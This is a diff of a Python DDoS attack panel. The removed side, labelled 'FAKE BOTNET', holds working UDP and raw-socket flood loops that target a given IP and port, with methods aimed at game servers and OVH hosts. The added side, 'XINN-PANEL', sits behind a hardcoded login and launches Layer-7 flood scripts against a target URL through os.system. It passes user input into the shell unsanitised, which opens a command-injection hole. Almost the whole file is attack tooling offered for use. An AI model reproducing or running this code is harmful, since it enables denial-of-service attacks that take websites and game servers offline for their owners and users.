@@ -1,313 +1,244 @@
-#!/usr/bin/env python3
-#-*- coding: utf-8 -*-
-import sys
+m# -*- coding: utf-8 -*-
+from operator import index
 import socket
-import time
 import random
+import string
 import threading
 import getpass
-import os
 import urllib
-import json
+import getpass
+import colorama
+import os,sys,time,re,requests,json
+from requests import post
+from time import sleep
+from datetime import datetime, date
+import codecs
 
-nicknm = "senengkan?"
+author = ""
 
-methods = """
-               \033[37m           ,MMM\033[35m8&&&.
-               \033[37m      _...MMMMM\033[35m88&&&&..._
-               \033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.
-               \033[37m  ::     MMMMM8\033[35m8&&&&&&     ::
-               \033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
-               \033[37m     `''''MMMMM\033[35m88&&&&''''`
-               \033[37m           'MMM\033[35m8&&&'
+def prints(start_color, end_color, text):
+    start_r, start_g, start_b = start_color
+    end_r, end_g, end_b = end_color
 
+    for i in range(len(text)):
+        r = int(start_r + (end_r - start_r) * i / len(text))
+        g = int(start_g + (end_g - start_g) * i / len(text))
+        b = int(start_b + (end_b - start_b) * i / len(text))
 
-[ LAYER - 4 ] 
+        color_code = f"\033[38;2;{r};{g};{b}m"
+        print(color_code + text[i], end="")
+    
+start_color = (255, 255, 255)
+end_color = (0, 0, 255)
 
-– .DNS : Multiple Amplification Methods
-– .OVHTCP : TCP OVH Interno Bypass
-– .OVHUDP : UDP OVH Game Bypass
-– .FIVEM : Game Flood Optimized For FM
-– .TCP : TCP Socket Flood and SYN-ACK
-– .NFO : SYN Flood + Raw UDP + Handshake
-– .R6DROP : Game Flood Optimized For R6
-– .RNDROP : Game Flood Optimized For FN
-– .SSH-DOWN : SSH V1/1.1/2 Flood
+class Color:
+    colorama.init()
 
-[ EXAMPLE ATTACK ]
-
-– .DNS:  [ IP ] [ PORT ] [ TIME ]
-– .OVHTCP: [ IP ] [ PORT ] [ TIME ]
-– .OVHUDP: [ IP ] [ PORT ] [ TIME ]
-– .FIVEM [ IP ] [ PORT ] [ TIME ]
-– .TCP [ IP ] [ PORT ] [ TIME ]
-– .NFO: [ IP ] [ PORT ] [ TIME ]
-– .R6DROP: [ IP ] [ PORT ] [ TIME ]
-– .RNDROP: [ IP ] [ PORT ] [ TIME ]
-– .SSHDOWN: [ IP ] [ PORT ] [ TIME ]
- """
-
-
-
-banner =  """
-Welcome - PAKAI NAMA KAMU YA [ C2 ].
-Founded By Ceow 
-Version, 1.1
-2022 - 2023
-\x1b[1;37mᴘʟᴇᴀsᴇ ᴛʏᴘᴇ " 𝓶𝓮𝓽𝓱𝓸𝓭𝓼 " ᴛᴏ sᴇᴇ ᴀʟʟ ᴛʜᴇ ᴍᴇᴛʜᴏᴅs.
-"""
-cookie = open(".sinfull_cookie","w+")
-
-fsubs = 0
-tpings = 0
-pscans = 0
-liips = 0
-tattacks = 0
-uaid = 0
-said = 0
-running = 0
-iaid = 0
-haid = 0
-aid = 0
-attack = True
-ldap = True
-http = True
-atks = 0
-
-def randsender(host, timer, port, punch):
-	global iaid
-	global aid
-	global tattacks
-	global running
-
-	timeout = time.time() + float(timer)
-	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
-
-	iaid += 1
-	aid += 1
-	tattacks += 1
-	running += 1
-	while time.time() < timeout and ldap and attack:
-		sock.sendto(punch, (host, int(port)))
-	running -= 1
-	iaid -= 1
-	aid -= 1
-
-
-def stdsender(host, port, timer, payload):
-	global atks
-	global running
-
-	timeout = time.time() + float(timer)
-	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-	
-	atks += 1
-	running += 1
-	while time.time() < timeout and attack:
-		sock.sendto(payload, (host, int(port)))
-		sock.sendto(payload, (host, int(port)))
-		sock.sendto(payload, (host, int(port)))
-		sock.sendto(payload, (host, int(port)))
-		sock.sendto(payload, (host, int(port)))
-		sock.sendto(payload, (host, int(port)))
-		sock.sendto(payload, (host, int(port)))
-		sock.sendto(payload, (host, int(port)))
-	atks -= 1
-	running -= 1
+def help():
+	os.system('cls' if os.name == 'nt' else 'clear')
+	print("""\033[36m
+                         ⣇⣿⠘⣿⣿⣿⡿⡿⣟⣟⢟⢟⢝⠵⡝⣿⡿⢂⣼⣿⣷⣌⠩⡫⡻⣝⠹⢿⣿⣷
+                         ⡆⣿⣆⠱⣝⡵⣝⢅⠙⣿⢕⢕⢕⢕⢝⣥⢒⠅⣿⣿⣿⡿⣳⣌⠪⡪⣡⢑⢝⣇
+                         ⡆⣿⣿⣦⠹⣳⣳⣕⢅⠈⢗⢕⢕⢕⢕⢕⢈⢆⠟⠋⠉⠁⠉⠉⠁⠈⠼⢐⢕⢽
+                         ⡗⢰⣶⣶⣦⣝⢝⢕⢕⠅⡆⢕⢕⢕⢕⢕⣴⠏⣠⡶⠛⡉⡉⡛⢶⣦⡀⠐⣕⢕
+                         ⡝⡄⢻⢟⣿⣿⣷⣕⣕⣅⣿⣔⣕⣵⣵⣿⣿⢠⣿⢠⣮⡈⣌⠨⠅⠹⣷⡀⢱⢕
+                         ⡝⡵⠟⠈⢀⣀⣀⡀⠉⢿⣿⣿⣿⣿⣿⣿⣿⣼⣿⢈⡋⠴⢿⡟⣡⡇⣿⡇⡀⢕
+                         ⡝⠁⣠⣾⠟⡉⡉⡉⠻⣦⣻⣿⣿⣿⣿⣿⣿⣿⣿⣧⠸⣿⣦⣥⣿⡇⡿⣰⢗⢄
+                         ⠁⢰⣿⡏⣴⣌⠈⣌⠡⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣬⣉⣉⣁⣄⢖⢕⢕⢕
+                         ⡀⢻⣿⡇⢙⠁⠴⢿⡟⣡⡆⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣵⣵⣿
+                         ⡻⣄⣻⣿⣌⠘⢿⣷⣥⣿⠇⣿⣿⣿⣿⣿⣿⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+                         ⣷⢄⠻⣿⣟⠿⠦⠍⠉⣡⣾⣿⣿⣿⣿⣿⣿⢸⣿⣦⠙⣿⣿⣿⣿⣿⣿⣿⣿⠟
+                         ⡕⡑⣑⣈⣻⢗⢟⢞⢝⣻⣿⣿⣿⣿⣿⣿⣿⠸⣿⠿⠃⣿⣿⣿⣿⣿⣿⡿⠁⣠
+                         ⡝⡵⡈⢟⢕⢕⢕⢕⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣿⣿⣿⣿⣿⠿⠋⣀⣈⠙
+                         ⡝⡵⡕⡀⠑⠳⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢉⡠⡲⡫⡪⡪⡣
+                         
+                            _  __ _____   ___   __      _   ______________
+                           | |/ //  _/ | / / | / /     / | / / ____/_  __/
+                           |   / / //  |/ /  |/ /_____/  |/ / __/   / /   
+                          /   |_/ // /|  / /|  /_____/ /|  / /___  / /    
+                         /_/|_/___/_/ |_/_/ |_/     /_/ |_/_____/ /_/     
+                                                 
+                                                 
+                              WELCOME TO XINN-PANEL
+	                     	BEEST PANEL IN THE WORLD
+                TYPE THE \033[36m[\033[32mMETHODS\033[36m] \033[36m[\033[32mURL\033[36m] \033[36m[\033[32mTIME\033[36m] TO START ATTACK
+                         AUTHOR IN TELEGRAM : @XEQUILLE
+                         •   SUPERMAN \033[36m[\033[32mL7\033[36m]
+                         •   NET  \033[36m[\033[32mL7\033[36m]
+                         •   MIX  \033[36m[\033[32mL7\033[36m]
+                         •   GEMBEL  \033[36m[\033[32mL7\033[36m]
+                         •   XINN  \033[36m[\033[32mL7\033[36m]
+                         •   TLS  \033[36m[\033[32mL7\033[36m]
+                         •   FROZ  \033[36m[\033[32mL7\033[36m]
+                         •   TNI  \033[36m[\033[32mL7\033[36m]
+                         •   STRONG  \033[36m[\033[32mL7\033[36m]
+                         •   XINN  \033[36m[\033[32mL7\033[36m]
+                         •   XINN  \033[36m[\033[32mL7\033[36m]
+\033[0m""")
 
 def main():
-	global fsubs
-	global tpings
-	global pscans
-	global liips
-	global tattacks
-	global uaid
-	global running
-	global atk
-	global ldap
-	global said
-	global iaid
-	global haid
-	global aid
-	global attack
-	global dp
+	os.system('cls' if os.name == 'nt' else 'clear')
+	print("""\033[36m
+                         ⣇⣿⠘⣿⣿⣿⡿⡿⣟⣟⢟⢟⢝⠵⡝⣿⡿⢂⣼⣿⣷⣌⠩⡫⡻⣝⠹⢿⣿⣷
+                         ⡆⣿⣆⠱⣝⡵⣝⢅⠙⣿⢕⢕⢕⢕⢝⣥⢒⠅⣿⣿⣿⡿⣳⣌⠪⡪⣡⢑⢝⣇
+                         ⡆⣿⣿⣦⠹⣳⣳⣕⢅⠈⢗⢕⢕⢕⢕⢕⢈⢆⠟⠋⠉⠁⠉⠉⠁⠈⠼⢐⢕⢽
+                         ⡗⢰⣶⣶⣦⣝⢝⢕⢕⠅⡆⢕⢕⢕⢕⢕⣴⠏⣠⡶⠛⡉⡉⡛⢶⣦⡀⠐⣕⢕
+                         ⡝⡄⢻⢟⣿⣿⣷⣕⣕⣅⣿⣔⣕⣵⣵⣿⣿⢠⣿⢠⣮⡈⣌⠨⠅⠹⣷⡀⢱⢕
+                         ⡝⡵⠟⠈⢀⣀⣀⡀⠉⢿⣿⣿⣿⣿⣿⣿⣿⣼⣿⢈⡋⠴⢿⡟⣡⡇⣿⡇⡀⢕
+                         ⡝⠁⣠⣾⠟⡉⡉⡉⠻⣦⣻⣿⣿⣿⣿⣿⣿⣿⣿⣧⠸⣿⣦⣥⣿⡇⡿⣰⢗⢄
+                         ⠁⢰⣿⡏⣴⣌⠈⣌⠡⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣬⣉⣉⣁⣄⢖⢕⢕⢕
+                         ⡀⢻⣿⡇⢙⠁⠴⢿⡟⣡⡆⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣵⣵⣿
+                         ⡻⣄⣻⣿⣌⠘⢿⣷⣥⣿⠇⣿⣿⣿⣿⣿⣿⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+                         ⣷⢄⠻⣿⣟⠿⠦⠍⠉⣡⣾⣿⣿⣿⣿⣿⣿⢸⣿⣦⠙⣿⣿⣿⣿⣿⣿⣿⣿⠟
+                         ⡕⡑⣑⣈⣻⢗⢟⢞⢝⣻⣿⣿⣿⣿⣿⣿⣿⠸⣿⠿⠃⣿⣿⣿⣿⣿⣿⡿⠁⣠
+                         ⡝⡵⡈⢟⢕⢕⢕⢕⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣿⣿⣿⣿⣿⠿⠋⣀⣈⠙
+                         ⡝⡵⡕⡀⠑⠳⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢉⡠⡲⡫⡪⡪⡣
+                         
+                            _  __ _____   ___   __      _   ______________
+                           | |/ //  _/ | / / | / /     / | / / ____/_  __/
+                           |   / / //  |/ /  |/ /_____/  |/ / __/   / /   
+                          /   |_/ // /|  / /|  /_____/ /|  / /___  / /    
+                         /_/|_/___/_/ |_/_/ |_/     /_/ |_/_____/ /_/     
+                                                 
+                                                 
+                              WELCOME TO XINN-PANEL
+		BEFORE USE OUR PANEL YOU MUST LOGIN TO UR ACCOUNT
+                          AUTHOR IN TELEGRAM : @XEQUILLE⠀⠀
+\033[0m""")
 
 	while True:
-		bots = (random.randint(32500,41500))
-		sys.stdout.write("\x1b]2; FAKEBOTNETCEOW. | Devices: [{}] | Spoofed Servers [19] | Server Units [8] | Clients: [18]\x07".format (bots))
-		sin = input("\033[0;30;45mFAKE @ BOTNET\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m".format(nicknm)).lower()
+		sys.stdout.write(f"\x1b]2;[\] XINN-Panel :: Online Users: [1] :: Attack Sended: [1/10]\x07")
+		sin = input("\033[0;30;46mXINN@PANEL\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m")
 		sinput = sin.split(" ")[0]
 		if sinput == "clear":
 			os.system ("clear")
-			print (banner)
 			main()
-		elif sinput == "methods":
-			os.system ("")
-			print (methods)
-			main()
-		elif sinput == "exit":
+		if sinput == "cls" or sinput == "CLS":
 			os.system ("clear")
-			exit()
-		elif sinput == ".ovhtcp":
-			try:
-				if running >= 1:
-					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
-					main()
-				else:
-					sinput, host, timer, port = sin.split(" ")
-					socket.gethostbyname(host)
-					payload = b"\x73\x74\x64\x00\x00\x00\x00\x00"
-					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
-					print("\033[1;37;40mSuccessfully broadcast to all \033[31mYou \033[37mservers...")
-			except ValueError:
-				main()
-			except socket.gaierror:
-				main()
-		elif sinput == ".dns":
-			try:
-				if running >= 999:
-					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
-					main()
-				else:
-					sinput, host, timer, port = sin.split(" ")
-					socket.gethostbyname(host)
-					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
-					print("\033[97mSuccessfully broadcast to all \033[31mYou \033[37mservers...")
-			except ValueError:
-				main()
-			except socket.gaierror:
-				main()
-		elif sinput == ".ovhudp":
-			try:
-				if running >= 999:
-					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
-					main()
-				else:
-						sinput, host, timer, port = sin.split(" ")
-						socket.gethostbyname(host)
-						payload = b"\x00\x02\x00\x2f"
-						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
-						print("\033[97mSuccessfully broadcast to all \033[31mYou \033[37mServer...")
-			except ValueError:
-				main()
-			except socket.gaierror:
-				main()
-		elif sinput == ".sshdown":
-			try:
-				if running >= 999:
-					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
-					main()
-				else:
-						sinput, host, timer, port = sin.split(" ")
-						socket.gethostbyname(host)
-						payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
-						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
-						print("\033[97mSuccessfully broadcast to all \033[31mYou \033[37mservers...")
-			except ValueError:
-				main()
-			except socket.gaierror:
-				main()
-		elif sinput == ".fivem":
-			try:
-				if running >= 991:
-					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
-					main()
-				else:
-						sinput, host, timer, port = sin.split(" ")
-						socket.gethostbyname(host)
-						payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
-						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
-						print("\033[97mSuccessfully broadcast to all \033[31mYou \033[37mservers...")
-			except ValueError: 
-				main()
-			except socket.gaierror:
-				main()
-		elif sinput == ".nfo":
-			try:
-				if running >= 999:
-					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
-					main()
-				else:
-					sinput, host, timer, port = sin.split(" ")
-					socket.gethostbyname(host)
-					pack = 10000
-					punch = random._urandom(int(pack))
-					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mSuccessfully broadcast to all \033[31mYou \033[37mservers...")
-			except ValueError:
-				main()
-			except socket.gaierror:
-				main()
-		elif sinput == ".tcp":
-			try:
-				if running >= 991:
-					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
-					main()
-				else:
-					sinput, host, timer, port = sin.split(" ")
-					socket.gethostbyname(host)
-					pack = 2048
-					punch = random._urandom(int(pack))
-					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mSuccessfully sent attack to all \033[31mYou \033[37mservers...")
-			except ValueError:
-				main()
-			except socket.gaierror:
-				main()
-		elif sinput == ".rndrop":
-			try:
-				if running >= 999:
-					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
-					main()
-				else:
-					sinput, host, timer, port = sin.split(" ")
-					socket.gethostbyname(host)
-					pack = 50000
-					punch = random._urandom(int(pack))
-					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mSuccessfully broadcast to all \033[31mYou \033[37mservers...")
-			except ValueError:
-				main()
-			except socket.gaierror:
-				main()
-		elif sinput == ".r6drop":
-			try:
-				if running >= 1:
-					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
-					main()
-				else:
-					sinput, host, timer, port = sin.split(" ")
-					socket.gethostbyname(host)
-					pack = 1460
-					punch = random._urandom(int(pack))
-					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mSuccessfully broadcast to all \033[31mYou \033[37mservers...")
-			except ValueError:
-				main()
-			except socket.gaierror:
-				main()
-		elif sinput == "stopattacks":
-			attack = False
-			while not attack:
-				if aid == 0:
-					attack = True
-		elif sinput == "stop":
-			attack = False
-			while not attack:
-				if aid == 0:
-					attack = True
-
-		else:
 			main()
+		if sinput == "help" or sinput == "HELP" or sinput == ".help" or sinput == ".HELP" or sinput == "menu" or sinput == ".menu" or sinput == "MENU" or sinput == ".MENU":
+			help()
 
+#########LAYER-7########  
+		elif sinput == "MIX" or sinput == "mix":
+			try:
+				url = sin.split()[1]
+				time = sin.split()[2]
+				os.system(f'node HTTP-MIX.js {url} {time}')
+				os.system ("clear")
+			except ValueError:
+				main()
+			except IndexError:
+				main()
 
-try:
-	clear = "clear"
-	os.system(clear)
-	print(banner)
-	main()
-except KeyboardInterrupt:
-	exit()
+		elif sinput == "NET" or sinput == "net":
+			try:
+				url = sin.split()[1]
+				time = sin.split()[2]
+				os.system(f'node NET.js {url} {time} 64 10 proxy.txt')
+				os.system ("clear")
+			except ValueError:
+				main()
+			except IndexError:
+				main()
 
+		elif sinput == "TLS" or sinput == "tls":
+			try:
+				url = sin.split()[1]
+				time = sin.split()[2]
+				os.system(f'node tls.js GET {url} {time} 8 1')
+				os.system ("clear")
+			except ValueError:
+				main()
+			except IndexError:
+				main()
+				
+		elif sinput == "POKER" or sinput == "poker":
+			try:
+				url = sin.split()[1]
+				time = sin.split()[2]
+				os.system(f'./POKER {url} proxy.txt {time} 64 1')
+				os.system ("clear")
+			except ValueError:
+				main()
+			except IndexError:
+				main()
+
+		elif sinput == "GEMBEL" or sinput == "gembel":
+			try:
+				url = sin.split()[1]
+				time = sin.split()[2]
+				os.system(f'node GEMBEL.js {url} proxy.txt {time}')
+				os.system ("clear")
+			except ValueError:
+				main()
+			except IndexError:
+				main()
+
+		elif sinput == "SUPERMAN" or sinput == "superman":
+			try:
+				url = sin.split()[1]
+				time = sin.split()[2]
+				os.system(f'node SUPERMAN.js {url} {time} 32 10 proxy.txt')
+				os.system ("clear")
+			except ValueError:
+				main()
+			except IndexError:
+				main()
+
+		elif sinput == "FROZ" or sinput == "froz":
+			try:
+				url = sin.split()[1]
+				time = sin.split()[2]
+				os.system(f'node FROZ.js {url} {time} 64 10 proxy.txt')
+				os.system ("clear")
+			except ValueError:
+				main()
+			except IndexError:
+				main()
+		
+					
+ 
+def login():
+	sys.stdout.write(f"\x1b]2;[\] XINN-Panel :: Online Users: [1] :: Attack Sended: [1/10]\x07")
+	os.system('cls' if os.name == 'nt' else 'clear')
+	user = "root"
+	passwd = "1907"
+	username = input("""\033[36m
+                         ⣇⣿⠘⣿⣿⣿⡿⡿⣟⣟⢟⢟⢝⠵⡝⣿⡿⢂⣼⣿⣷⣌⠩⡫⡻⣝⠹⢿⣿⣷
+                         ⡆⣿⣆⠱⣝⡵⣝⢅⠙⣿⢕⢕⢕⢕⢝⣥⢒⠅⣿⣿⣿⡿⣳⣌⠪⡪⣡⢑⢝⣇
+                         ⡆⣿⣿⣦⠹⣳⣳⣕⢅⠈⢗⢕⢕⢕⢕⢕⢈⢆⠟⠋⠉⠁⠉⠉⠁⠈⠼⢐⢕⢽
+                         ⡗⢰⣶⣶⣦⣝⢝⢕⢕⠅⡆⢕⢕⢕⢕⢕⣴⠏⣠⡶⠛⡉⡉⡛⢶⣦⡀⠐⣕⢕
+                         ⡝⡄⢻⢟⣿⣿⣷⣕⣕⣅⣿⣔⣕⣵⣵⣿⣿⢠⣿⢠⣮⡈⣌⠨⠅⠹⣷⡀⢱⢕
+                         ⡝⡵⠟⠈⢀⣀⣀⡀⠉⢿⣿⣿⣿⣿⣿⣿⣿⣼⣿⢈⡋⠴⢿⡟⣡⡇⣿⡇⡀⢕
+                         ⡝⠁⣠⣾⠟⡉⡉⡉⠻⣦⣻⣿⣿⣿⣿⣿⣿⣿⣿⣧⠸⣿⣦⣥⣿⡇⡿⣰⢗⢄
+                         ⠁⢰⣿⡏⣴⣌⠈⣌⠡⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣬⣉⣉⣁⣄⢖⢕⢕⢕
+                         ⡀⢻⣿⡇⢙⠁⠴⢿⡟⣡⡆⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣵⣵⣿
+                         ⡻⣄⣻⣿⣌⠘⢿⣷⣥⣿⠇⣿⣿⣿⣿⣿⣿⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+                         ⣷⢄⠻⣿⣟⠿⠦⠍⠉⣡⣾⣿⣿⣿⣿⣿⣿⢸⣿⣦⠙⣿⣿⣿⣿⣿⣿⣿⣿⠟
+                         ⡕⡑⣑⣈⣻⢗⢟⢞⢝⣻⣿⣿⣿⣿⣿⣿⣿⠸⣿⠿⠃⣿⣿⣿⣿⣿⣿⡿⠁⣠
+                         ⡝⡵⡈⢟⢕⢕⢕⢕⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣿⣿⣿⣿⣿⠿⠋⣀⣈⠙
+                         ⡝⡵⡕⡀⠑⠳⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢉⡠⡲⡫⡪⡪⡣
+                         
+                            _  __ _____   ___   __      _   ______________
+                           | |/ //  _/ | / / | / /     / | / / ____/_  __/
+                           |   / / //  |/ /  |/ /_____/  |/ / __/   / /   
+                          /   |_/ // /|  / /|  /_____/ /|  / /___  / /    
+                         /_/|_/___/_/ |_/_/ |_/     /_/ |_/_____/ /_/     
+                                                 
+                                                 
+                              WELCOME TO XINN-PANEL
+		BEFORE USE OUR PANEL YOU MUST LOGIN TO UR ACCOUNT
+                          AUTHOR IN TELEGRAM : @XEQUILLE⠀⠀
+						   
+\033[36m[\033[32mUSERNAME\033[36m]:\033[0m """)
+	password = getpass.getpass(prompt='\033[36m[\033[32mPASSWORD\033[36m]:\033[0m ')
+	if username != user or password != passwd:
+		print("")
+		sys.exit(1)
+	elif username == user and password == passwd:
+		print("\033[36mSuccessfully Login to ur Account")
+		time.sleep(1)
+		main()
+
+login()
